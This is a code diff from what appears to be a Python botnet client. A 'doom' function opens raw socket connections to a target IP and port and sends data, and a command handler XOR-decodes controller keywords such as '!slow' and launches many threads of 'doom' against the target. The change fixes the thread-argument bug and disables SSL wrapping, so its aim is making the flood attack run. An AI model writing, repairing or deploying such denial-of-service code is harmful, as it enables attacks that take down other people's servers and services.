@@ -50,8 +50,8 @@ def doom(ip, url, port):
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         s.connect((str(ip),int(port)))
                         if int(port) == 80 or int(port) == 443:
-                                ctx = ssl.SSLContext()
-                                s = ctx.wrap_socket(s,server_hostname=ip)
+                                #ctx = ssl.SSLContext()
+                                #s = ctx.wrap_socket(s,server_hostname=ip)
                                 webbrowser.open(url)#not sure this is the best way
                         connection = "Connection: Keep-Alive\r\n"
                         s.send("\000".encode())
@@ -124,7 +124,7 @@ def handle(sock):
 						attack =0
 					stop= False
 					for _ in range(int(command[3])):
-						p= threading.Thread(target=doom, args = command[1], command[2], command[4])#1=!volume, 2=ipaddress 3=port 80 or 443?
+						p= threading.Thread(target=doom, args = (command[1], command[2], command[4]))#1=ip, 2=url 3=port
 						p.start()
 					attack+=1
 				elif command[0] == xor_dec('QAAICRA=',key):#encoded keywords: !slow
